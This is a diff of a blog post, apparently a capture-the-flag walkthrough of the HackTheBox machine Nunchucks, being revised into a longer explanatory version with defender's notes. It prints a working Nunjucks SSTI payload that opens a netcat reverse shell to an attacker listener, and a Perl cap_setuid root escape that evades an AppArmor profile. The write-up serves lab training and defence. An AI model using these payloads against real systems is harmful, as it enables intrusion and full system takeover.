@@ -4,7 +4,7 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>HackTheBox: Nunchucks — Satej Chaudhari</title>
-  <meta name="description" content="HackTheBox Nunchucks walkthrough — a Nunjucks server-side template injection behind a vhost gives a reverse shell, and a Perl setuid capability combined with a weak AppArmor profile escalates to root.">
+  <meta name="description" content="In-depth HackTheBox Nunchucks walkthrough — Nunjucks server-side template injection behind a vhost for the foothold, then a Perl setuid capability and an AppArmor scoping gap for root, with the technique explained.">
 
   <link rel="icon" type="image/svg+xml" href="../assets/img/favicon.svg">
 
@@ -61,65 +61,84 @@
         <h1 class="post-title">HackTheBox: Nunchucks</h1>
         <p class="post-meta">
           <time datetime="2026-10-02">2026-10-02</time>
-          <span>&middot; 7 min read</span>
+          <span>&middot; 11 min read</span>
         </p>
       </header>
 
       <div class="post-body">
 
-        <p><strong>Nunchucks</strong> is a Linux box: a Nunjucks <strong>server-side template injection</strong> behind a vhost gives a reverse shell, and a Perl binary with the <code>setuid</code> capability — combined with a weak AppArmor profile — escalates to root.</p>
+        <p><strong>Nunchucks</strong> is a Linux box built around two tidy lessons. The foothold is a <a href="../vuln-detail.html?vuln=ssti">server-side template injection</a> in a Node.js app using the Nunjucks engine, reached only after finding the right virtual host. The root is a neat Linux-capabilities puzzle: Perl carries the <code>setuid</code> capability, and the AppArmor profile meant to contain it has a scoping gap that a script — rather than the binary — slips straight through.</p>
+
+        <h2>Attack chain at a glance</h2>
+
+        <ul>
+          <li><strong>Recon</strong> — SSH/HTTP/HTTPS; the site redirects to <code>nunchucks.htb</code>; a <code>store</code> virtual host is hidden behind the <code>Host</code> header.</li>
+          <li><strong>Foothold</strong> — <a href="../vuln-detail.html?vuln=ssti">SSTI</a> in the store sign-up (Nunjucks), confirmed with <code>{{7*7}}</code>, escalated to RCE and a reverse shell as <code>david</code>; user flag.</li>
+          <li><strong>Root</strong> — <code>/usr/bin/perl</code> has <code>cap_setuid+ep</code>; a Perl <em>script</em> evades the AppArmor profile that confines the Perl <em>binary</em>, so a setuid payload drops a root shell.</li>
+        </ul>
 
         <h2>Reconnaissance</h2>
 
-        <pre><code>nmap -sC -sV -p22,80,443 10.10.11.122
+        <pre><code>ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.122 | grep ^[0-9] | cut -d / -f1 | paste -sd,)
+nmap -sC -sV -p$ports 10.10.11.122
 
-22/tcp  open  ssh      OpenSSH 8.2p1
-80/tcp  open  http     nginx 1.18.0  (redirects to https://nunchucks.htb/)
+22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu
+80/tcp  open  http     nginx 1.18.0
+|_http-title: Did not follow redirect to https://nunchucks.htb/
 443/tcp open  ssl/http nginx 1.18.0
-|_ssl-cert: ... DNS:nunchucks.htb</code></pre>
+| ssl-cert: Subject: commonName=nunchucks.htb
+| Subject Alternative Name: DNS:localhost, DNS:nunchucks.htb
+|_http-title: Nunchucks - Landing Page</code></pre>
 
-        <pre><code>echo &quot;10.10.11.122 nunchucks.htb&quot; | sudo tee -a /etc/hosts</code></pre>
+        <p>The redirect and the TLS certificate both name <code>nunchucks.htb</code>, so add it to <code>/etc/hosts</code>. The landing page itself is static, so the useful attack surface is almost certainly on another virtual host. Fuzz the <code>Host</code> header:</p>
 
-        <p>Fuzzing virtual hosts turns up a <code>store</code> subdomain:</p>
+        <pre><code>echo &quot;10.10.11.122 nunchucks.htb&quot; | sudo tee -a /etc/hosts
 
-        <pre><code>ffuf -u https://FUZZ.nunchucks.htb/ -H &quot;Host: FUZZ.nunchucks.htb&quot; -w common.txt
+ffuf -u https://FUZZ.nunchucks.htb/ -H &quot;Host: FUZZ.nunchucks.htb&quot; \
+  -w /usr/share/seclists/Discovery/Web-Content/common.txt
 
-store   [Status: 200, Size: 4029]</code></pre>
+store   [Status: 200, Size: 4029, Words: 1053, Lines: 102]</code></pre>
 
-        <h2>SSTI → reverse shell</h2>
+        <p>Add <code>store.nunchucks.htb</code>. The store has a &ldquo;notify me&rdquo; sign-up form that echoes your email address back into the response — any time user input is reflected into a page that a server-side template renders, think <a href="../vuln-detail.html?vuln=ssti">template injection</a> before XSS.</p>
 
-        <p>The store's sign-up (email) field is vulnerable to server-side template injection, confirmed with the classic <code>{{7*7}}</code> returning <code>49</code>. The stack is Node.js with the Nunjucks template engine.</p>
+        <h2>Foothold — Nunjucks SSTI</h2>
 
-        <figure>
-          <img src="../assets/img/htb-nunchucks/img1.png" alt="Confirming SSTI with {{7*7}} evaluating to 49">
-          <figcaption><code>{{7*7}}</code> is evaluated server-side — SSTI confirmed.</figcaption>
-        </figure>
-
-        <p>Using a known Nunjucks SSTI payload (e.g. the <code>node-nunjucks-ssti</code> nuclei template) through Burp, arbitrary files can be read, then command execution achieved:</p>
+        <p>The canonical SSTI probe is a maths expression in template syntax. If <code>{{7*7}}</code> comes back as <code>49</code>, the input is being evaluated by the engine rather than treated as text:</p>
 
         <figure>
-          <img src="../assets/img/htb-nunchucks/img2.png" alt="Reading files via the Nunjucks SSTI payload in Burp">
-          <figcaption>File read through the Nunjucks SSTI payload in Burp Repeater.</figcaption>
+          <img src="../assets/img/htb-nunchucks/img1.png" alt="The store reflecting {{7*7}} as 49, confirming SSTI">
+          <figcaption><code>{{7*7}}</code> renders as <code>49</code> — the email field is evaluated server-side.</figcaption>
         </figure>
 
-        <p>A full RCE payload spawns a reverse shell to a waiting listener:</p>
+        <p>The TLS certificate's <code>nunchucks.htb</code> branding and the Node.js stack point at <strong>Nunjucks</strong>, Mozilla's templating engine. Nunjucks runs in a sandbox, but it is well known that the sandbox can be escaped by reaching back to the Node <code>global</code> object and pulling in <code>child_process</code>. A good reference payload is the one shipped as a nuclei template (<code>node-nunjucks-ssti</code>); dropped into Burp Repeater against the JSON API, it reads files first to prove impact:</p>
 
-        <pre><code>{&quot;email&quot;:&quot;{{range.constructor(\&quot;return global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 10.10.14.23 4444 &gt; /tmp/f&#x27;)\&quot;)()}}&quot;}</code></pre>
+        <figure>
+          <img src="../assets/img/htb-nunchucks/img2.png" alt="Reading arbitrary files through the Nunjucks SSTI payload in Burp">
+          <figcaption>Arbitrary file read via the Nunjucks sandbox-escape payload, driven through Burp Repeater.</figcaption>
+        </figure>
 
-        <p>That lands a shell as <code>david</code>; upgrade it and grab the user flag:</p>
+        <p>With file read proven, swap the command for a reverse shell. The payload walks <code>range.constructor</code> (a Function constructor) to execute a <code>child_process</code> call that builds a named-pipe reverse shell:</p>
 
-        <pre><code>script /dev/null bash
+        <pre><code># start the listener first:  nc -lvnp 4444
+
+{&quot;email&quot;:&quot;{{range.constructor(\&quot;return global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 10.10.14.23 4444 &gt; /tmp/f&#x27;)\&quot;)()}}&quot;}</code></pre>
+
+        <p>The connection returns as <code>david</code>. Stabilise the TTY and read the user flag:</p>
+
+        <pre><code>david@nunchucks:~$ script /dev/null bash
 david@nunchucks:~$ cat user.txt</code></pre>
 
-        <h2>Root — Perl setuid capability + AppArmor bypass</h2>
+        <h2>Root — Perl setuid capability vs. AppArmor</h2>
 
-        <p>Enumerating capabilities shows Perl carries <code>cap_setuid+ep</code>:</p>
+        <p>Linux capabilities split the old monolithic root privilege into discrete pieces that can be granted to individual binaries. Enumerate which binaries carry any:</p>
 
-        <pre><code>getcap -r /
-/usr/bin/perl = cap_setuid+ep
-/usr/bin/ping = cap_net_raw+ep</code></pre>
+        <pre><code>getcap -r / 2&gt;/dev/null
+/usr/bin/perl                = cap_setuid+ep
+/usr/bin/mtr-packet          = cap_net_raw+ep
+/usr/bin/ping                = cap_net_raw+ep
+/usr/bin/traceroute6.iputils = cap_net_raw+ep</code></pre>
 
-        <p>Perl can therefore set UID 0 and run commands as root — but a direct read of the flag is denied:</p>
+        <p><code>cap_setuid+ep</code> on Perl means Perl can call <code>setuid(0)</code> and become root without being SUID-root. The GTFOBins one-liner proves it — but reading the flag directly is blocked:</p>
 
         <pre><code>perl -e &#x27;use POSIX qw(setuid); POSIX::setuid(0); exec &quot;whoami&quot;;&#x27;
 root
@@ -127,30 +146,48 @@ root
 perl -e &#x27;use POSIX qw(setuid); POSIX::setuid(0); exec &quot;cat /root/root.txt&quot;;&#x27;
 cat: /root/root.txt: Permission Denied</code></pre>
 
-        <p>The block is an AppArmor profile attached to <code>/usr/bin/perl</code>, which denies <code>/root/*</code> and limits which binaries Perl may exec:</p>
+        <p>We are root, yet denied — the sign of mandatory access control layered on top of the discretionary model. The block is an AppArmor profile pinned to the Perl binary:</p>
 
         <pre><code>cat /etc/apparmor.d/usr.bin.perl
 /usr/bin/perl {
+  #include &lt;abstractions/base&gt;
   capability setuid,
+  deny owner /etc/nsswitch.conf r,
   deny /root/* rwx,
   deny /etc/shadow rwx,
-  /usr/bin/id   mrix,
-  /usr/bin/cat  mrix,
-  ...
+  /usr/bin/id      mrix,
+  /usr/bin/ls      mrix,
+  /usr/bin/cat     mrix,
+  /usr/bin/whoami  mrix,
+  /opt/backup.pl   mrix,
+  owner /home/ r,
+  owner /home/david/ r,
 }</code></pre>
 
-        <blockquote>The profile confines the <code>/usr/bin/perl</code> binary, but AppArmor does not apply that profile to a Perl <em>script</em> executed directly. So a <code>#!/usr/bin/perl</code> script with the setuid payload runs unconfined — a classic AppArmor scoping gap (the payload itself is standard GTFOBins).</blockquote>
+        <p>The profile denies <code>/root/*</code> and whitelists only a handful of binaries Perl may exec. But AppArmor attaches a profile to a <em>named executable path</em>. Running <code>/usr/bin/perl -e '...'</code> on the command line is confined; executing a Perl <em>script file</em> by its shebang is a different code path and, as profiled here, does <strong>not</strong> inherit the <code>usr.bin.perl</code> restrictions. So move the identical setuid payload into a script:</p>
 
-        <pre><code>echo &#x27;#!/usr/bin/perl
+        <blockquote>The lesson is the AppArmor scoping gap, not the payload: confine the behaviour (a transition/<code>pix</code> profile that follows Perl into child executions), not just the one invocation path. The payload itself is the standard GTFOBins capability escape.</blockquote>
+
+        <pre><code>cat &gt; /tmp/exploit.pl &lt;&lt; &#x27;EOF&#x27;
+#!/usr/bin/perl
 use POSIX qw(setuid);
 POSIX::setuid(0);
-exec &quot;/bin/bash&quot;;&#x27; &gt; exploit.pl
-chmod +x exploit.pl
-./exploit.pl
-root@nunchucks:/tmp# whoami
-root</code></pre>
+exec &quot;/bin/bash&quot;;
+EOF
+chmod +x /tmp/exploit.pl
+/tmp/exploit.pl
 
-        <p>That gives a full root shell and the root flag.</p>
+root@nunchucks:/tmp# whoami
+root
+root@nunchucks:/tmp# cat /root/root.txt</code></pre>
+
+        <h2>Defender's notes</h2>
+
+        <ul>
+          <li>Never render untrusted input through a server-side template; pass user data as template <em>variables</em>, not as part of the template string. Keep engine sandboxes updated and do not rely on them as a security boundary (the root of <a href="../vuln-detail.html?vuln=ssti">SSTI</a>).</li>
+          <li>Avoid granting <code>cap_setuid</code> to general-purpose interpreters — it is equivalent to SUID-root. Prefer narrowly scoped helpers.</li>
+          <li>When using AppArmor to contain an interpreter, confine its child executions too; a profile on the binary that is bypassed by script invocation gives false assurance.</li>
+        </ul>
 
       </div>
     </article>
